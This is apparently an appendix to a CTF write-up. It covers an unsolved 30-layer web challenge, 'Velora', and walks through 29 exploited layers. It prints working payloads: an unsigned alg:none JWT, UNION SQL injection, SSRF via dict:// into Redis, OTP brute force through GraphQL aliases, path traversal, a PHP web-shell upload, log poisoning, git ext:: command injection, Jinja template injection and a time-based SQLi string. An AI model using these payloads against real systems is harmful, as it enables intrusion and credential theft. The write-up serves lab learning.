The string matched the announced flag format and the platform accepted it on the first submission.

---

## Velora — the one that killed us up

*Appendix — not a challenge card: Velora (9125) was not solved by Dente, so it is documented here rather than in the cards above. It is the one that got away.*


Web · Hard · 900 points · 30 layers

**Tools used:** one `requests.Session` per walk and two scripts — `walk.py` for L1–L20, `l21_29.py` for L21–L29 — with every gate response saved to disk. No scanner: the chain is order-sensitive, and each layer had to be earned before the next one would answer.

**tl;dr.** Thirty strictly ordered layers, each one answering only when `X-Chain` replays every proof the earlier layers handed back — and from L4 on, the plane also checks that the earlier step genuinely fired. We walked twenty-nine of them live: from a per-session HTML comment on the landing page to a settled ledger entry, through an unsigned admin JWT, a UNION into a table that is in no schema we had seen, a `dict://` pivot into Redis, a persisted-operation GraphQL gate, and a hundred thousand OTP codes in one document. The thirtieth gate returned one sentence: `{"ok": false, "layer": 30, "error": "The navigator has not recorded a delay."}` One layer from the flag. We did not solve Velora and we are not going to dress that up — but twenty-nine layers, each with a request and a byte-exact response, is the part we did win.

### The walk

Every request below runs in the same session. `X-Chain` always carries every proof so far, joined with `|`; the chain is session-bound and its length is fixed, so a missing or an extra segment answers `404`, not a hint.

1. **L1 — the channel token.** `GET /` carries `<!-- channel:/x/<hex> -->`. The token is minted per session, so sign up first (`POST /signup`, `plan=enterprise`), then read it in that same session. `GET /x/<token>` → `{"layer":1,"proof":"<p1>","note":"Bootstrap accepted. Crawler rules ship with the site."}`

2. **L2 — the crawl map.** `GET /robots.txt` → `# budget:/x/<hex>`. `GET /x/<token>` with `X-Chain: <p1>` → layer 2, "Crawl map accepted. The console bundle ships with every page."

3. **L3 — the bundle.** `GET /static/app.js` → `// map:/x/<hex>`. `X-Chain: p1|p2` → layer 3, "Bundle accepted," plus a `next`.

4. **L4 — the plan.** Gate with `X-Chain: p1|p2|p3` fires only if the workspace is on `plan=enterprise`, which is a signup field and not a page: without it the gate answers "This workspace is not on a plan that includes operator tools." With it, "Plan updated."

5. **L5 — the member record.** The gate says "Operator member settings have not been read." `GET /api/members/<uuid>/settings` — the UUID is in the JSON-LD on `/company` — then the gate again → "Member settings recovered."

6. **L6 — the design-review tenant.** Gate: "This is not the design-review tenant session." `/login` carries two XOR masks, `data-cfemail` and `data-review`, that decode to the preview account and its passphrase. Log in as preview, then `POST /signup` with the same email and `plan=enterprise`; the in-session signup upgrades that workspace instead of creating a new user. Gate → "Design-review session confirmed," and `next` points at L7.

7. **L7 — the unsigned admin.** Five lanes had already killed HS256 cracking (14.3M rockyou candidates, 88k themed words, every key-shaped public string), `kid`/`jku` injection and the whole header-and-param surface. The way through is not forgery but the absence of it: keep the walked session's `sid`, replace only `velora_session` with `base64url({"alg":"none","typ":"JWT"}) + "." + base64url(<payload with "role":"admin">) + "."` — an empty signature — and call the gate. `{"ok":true,"layer":7,"note":"Console is open."}` Note the vocabulary gap: the message says *operator*, the accepted claim is `admin`.

8. **L8 — the partner export.** `GET /api/v1/export/1001`, the legacy partner ticket (5001–5003 are the workspace's own). Gate → "Partner export recovered."

9. **L9 — the hidden table.** `/catalog` is an operator tool and opens with L7. Its search "hits the embedded store directly", seven columns wide, column 2 rendered as the bold name: `GET /catalog?q=zzz' UNION SELECT id,name,detail,'x','x','x','x' FROM fabric_routes--`. The table is in no schema we had seen, and it returns the four rows that drive the next four layers: `preview → /api/preview`, `host → [redacted-host]`, `ports → 80 6379 9200`, `links → X-Forwarded-Host`. Gate → "Fabric map recovered."

10. **L10 — the host override.** Send the internal hostname to the edge: `X-Forwarded-Host: [redacted-host]` on the gate. → "Host override stored."

11. **L11 — the fabric index.** `GET /api/preview?url=http://[redacted-host]/` with the same header → `<h1>Fabric index</h1><ul><li>edge :80</li><li>cache :6379</li><li>settle :9200</li></ul>`. Gate → "Fabric index retrieved."

12. **L12 — the alternate origin.** The gate first answers "An alternate origin has not been fetched." The preview filter drops literal private addresses but not short forms, so `GET /api/preview?url=http://127.1/` returns the same index from loopback. Gate → "Alternate origin answered."

13. **L13 — the cache port.** `GET /api/preview?url=http://127.1:6379/` → `{"error":"upstream is not HTTP","banner":"-ERR unknown command"}`. Gate → "Cache port answered."

14. **L14 — the keyspace.** The preview worker speaks more than HTTP: `GET /api/preview?url=dict://127.1:6379/KEYS` → `['operator.session', 'queue.settle', 'lock.nav', 'cache.catalog']`. Gate → "Keyspace listed."

15. **L15 — the operator session.** `dict://127.1:6379/GET operator.session` → `op_<24 hex>`. Gate → "Session value stored."

16. **L16 — the cookie.** Replay the value as `Cookie: operator=op_<24 hex>`. Gate → "Operator restored."

17. **L17 — the persisted operation.** `/api/graphql` only accepts persisted operations by hash, but it hashes the text you inline and compares it with the `sha256Hash` you declare — so a self-hashed document passes the hash gate, and the operation name is then checked against what the server ships. `POST /api/graphql` with `{"query":"query { health }","extensions":{"persistedQuery":{"version":1,"sha256Hash":<sha256 of that exact text>}}}` → `{"data":{"health":"ok"}}`. Gate → "Health operation accepted."

18. **L18 — the ledger keys.** The same trick with `{ accounts { holder internalLedgerKey } }` → three holders with their `internalLedgerKey` values (redacted). Gate → "Ledger operation accepted."

19. **L19 — the 100,000-code step-up.** Ticket 1001 says the codes are five digits and "the attempt counter is kept once per request." So one request carries the whole space as aliases: `mutation { a0: verifyOtp(code:"00000"){ok} … a99999: verifyOtp(code:"99999"){ok} }`, self-hashed. → `{"data":{"verifyOtp":{"ok":true,"session":"otp_ok"}},"checked":100000}`. Gate → "Step-up complete."

20. **L20 — the dashboard.** `GET /dashboard` now serves the Operations page (`page=dashboard-pages/home.html` is its own form default) instead of the step-up 403. Gate → "Dashboard template loaded."

21. **L21 — the schema, through the page primitive.** `?doc=` requires a literal `library/` prefix, so the brief's `../../secret/schema.txt` dies on the doc primitive. `?page=` has no such prefix: `GET /dashboard?page=dashboard-pages/../../secret/schema.txt` → 244 bytes — `config(name, value)`, `nav(link, label)`, a note that `settlement_record` is inserted into `config` by the settlement job, the access-log path, and `/entrypoint.sh`. Gate → "Schema recovered."

22. **L22 — the handler map.** `GET /library?doc=library/../../../../etc/apache2/mods-enabled/php.conf` → 195 bytes: `AddHandler application/x-httpd-php .php`, then the two lines that make L23 work — handler tokens are matched *inside* the filename, not only as the final extension, and `/support` stores the original client filename under `/uploads/`. Gate → "Handler map recovered."

23. **L23 — the desk shell.** `POST /support` multipart, `filename="shell.pHp.jpg"`, body `GIF89a<?php system($_GET["c"]); ?>`; then `GET /uploads/shell.pHp.jpg?c=id` → `uid=48(desk)`. Lowercase `.php.jpg` is served raw; the mixed case is what the handler matches. Gate → "Desk account confirmed."

24. **L24 — the web account.** Poison the access log with a User-Agent carrying the same payload, then include the log through the page primitive: `GET /dashboard?page=dashboard-pages/../../../../../var/log/apache2/access.log&c=id` → `uid=33(www-data)`. Gate → "Web account confirmed."

25. **L25 — the service account.** Same include with `c=cat /entrypoint.sh` → `RECON_USER=svc.settle`. Gate → "Service account name recovered."

26. **L26 — the settlement secret.** Back to the desk shell: `GET /uploads/<shell>?c=cat /opt/velora/reconcile.env` → `RECON_PASS=[redacted]`. Gate → "Settlement secret recovered."

27. **L27 — the nightly job.** `/import` executes git's `ext::` transport: `POST /import` with `repo_url=ext::sh -c cat$IFS/opt/velora/nightly.sh>&2` → the job script, whose payload line is `curl -s -u "$RECON_USER:$RECON_PASS" http://127.0.0.1:9200/ledger/reconcile`. Gate → "Job script recovered."

28. **L28 — the release note.** `/request-demo` renders the visitor name through Jinja: `name={{lipsum.__globals__['os'].popen('cat /root/velora/release.note').read()}}` → the note. It says `settlement_record` is written into `config` only after reconcile succeeds, and gives the navigator query `SELECT link, label FROM nav WHERE role = '<role>' ORDER BY sort` — plus the sentence that becomes L30. Gate → "Release note recovered."

29. **L29 — the reconcile.** The preview worker will carry credentials to a loopback URL: `GET /api/preview?url=http://svc.settle:<RECON_PASS>@127.1:9200/ledger/reconcile` → `{"release_code":"<redacted>","status":"reconciled","note":"config updated"}`. Gate → "Settlement reconciled." `next` hands back the thirtieth token.

### L30 — the wall

The gate is one sentence, and it is the whole specification we had:

```
{"ok": false, "layer": 30, "error": "The navigator has not recorded a delay."}
```

The only artifact that describes a navigator is the release note from L28. Three facts in it matter:

- the query is `SELECT link, label FROM nav WHERE role = '<role>' ORDER BY sort`;
- the wrapper appends the sort clause;
- "A timing probe is recorded only after that clause is no longer part of the statement."

Read together, that is a legible payload shape even without the endpoint. `role` is interpolated inside a quoted string and `sort` is appended by the wrapper, so a role value that closes the quote, injects a delay and comments out the appended clause turns the nav render into a timing probe — the same recursive-CTE burn we carried everywhere else:

```
role=x' AND 1=(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT x FROM c))--
```

What we could not find is anything that runs it.

**What we tried.**

- **Role and sort carriers.** Seventeen role-ish and fourteen sort-ish parameter names across `/`, `/desk`, `/dashboard`, `/library`, `/console`, `/company`, `/catalog`, `/admin`, `/uploads`, `/support`, `/import` and `/status`; GET query and POST JSON; the same names as JWT claims (`role`, `name`, `sub`, `iss`, `unit`, `plan`, `tier`) and as signup mass-assignment. Every answer was the untouched page or the untouched gate, and every timing was flat within noise.
- **A method-first route oracle over 1,341 paths.** ~110 challenge words × 9 prefixes, GET and POST each, filtering only the two known 404 shapes (22-byte JSON, 1,693-byte HTML). It found the four gates we already knew and nothing else; nested guesses under `/api/`, `/console/`, `/dashboard/` and `/x/` added nothing.
- **Slow preview targets.** Non-routable hosts and slow paths through `/api/preview` return `504 {"error":"egress timed out"}` in ~0.28 s. That is a timeout, not a delay, and the gate never reads it.
- **The settle service directly.** `POST /ledger/reconcile` with and without the service credentials, plus `/nav`, `/navigator`, `/navigation`, `/ledger/*` and ES-style `/_search` → 404 or the same stub. `:9200` answers exactly one route, and it is L29's.
- **Both include jails, ~74,000 path probes.** `/library?doc=` and `/dashboard?page=` for a nav renderer, a template, or any application source. Both jails resolve to a handful of curated objects — `/etc/passwd`, `php.conf` and a welcome page behind the first; the schema and the access log behind the second. No source, no route table, no navigator.
- **Redis.** `lock.nav` is in the keyspace and reads `null`. The `dict://` transport is GET-only from the preview worker, so there is no write path from where we stood.

**Why we stopped.** Not for lack of guesses. The mock is authored, not implemented: the upload shell is a regex that fakes `system()`, the import shell is the same emulator, the GraphQL endpoint is a hash check plus a fixed operation list, and both include jails are dictionaries. Every route that exists is named somewhere in an artifact. The navigator is named only in the release note, and no reachable surface implements it — not the web app, not `:6379`, not `:9200`, not `:80`. At close the container was gone, so a fresh differential pass was no longer possible either. We are calling it at 29.

### What we would do with one more hour

- **Derive the route instead of fuzzing it.** `schema.txt` names exactly two tables — `config(name, value)` and `nav(link, label)` — and the dashboard's own form names its template namespace (`dashboard-pages/*`). One hour of reading that namespace and the handler map, with the 1,341-path oracle used as confirmation rather than discovery, is worth more than another 74,000 guesses: if the navigator is a page it is under `dashboard-pages/`, and if it is a handler, `php.conf` is where its naming rule lives.
- **Make the delay a state change, not a duration.** `lock.nav` exists in the keyspace, which means something writes it. Read `lock.nav` before and after every L29 variant — a different release code, a repeated reconcile, a second reconcile with the credentials omitted — and diff. If it flips, the navigator is downstream of settle and the "delay" is a side effect of the reconcile, not of a SQL query at all.
- **Instrument one clean pass end to end.** One script, L1–L29, logging every response header, `Set-Cookie`, gate `note` and millisecond timing. The brief says the plane checks from L4 that earlier steps *genuinely fired*; if L30 wants a delay recorded earlier in the walk, a single ordered timeline is the only artifact that shows where it should have been written.

### Lessons

- **Record negatives per layer.** Every "not this" here carries its request and byte-exact response — 14.3M rockyou candidates, 1,341 routes, 74,000 include probes, six lanes of dead surfaces. The ledger is why the walk took one session instead of thirty: nobody repeated a falsified idea, and every new gate message could be compared against a known-good baseline.
- **A gate message is a spec.** "Operator role was not accepted" did not mean the token had to be signed, and it did not mean the role had to be called `operator`; the accepted claim was `admin` in an unsigned token. "The navigator has not recorded a delay" is the same kind of sentence — it names a *recorded* fact, not a slow response. Read it literally and the search space shrinks; read it as a vibe and you spend an hour timing `504`s.
- **The mock surfaces are authored, so unlisted routes cannot be guessed — only derived.** Every layer that opened was named by an artifact: a comment in `/`, a line in `robots.txt`, a token in `app.js`, a UUID in JSON-LD, a table in a SQL result, a key in Redis, a path in `php.conf`, a query in a release note. The 1,341-path oracle found zero new routes because there were zero to find. Wordlists confirm absence; artifacts create presence.
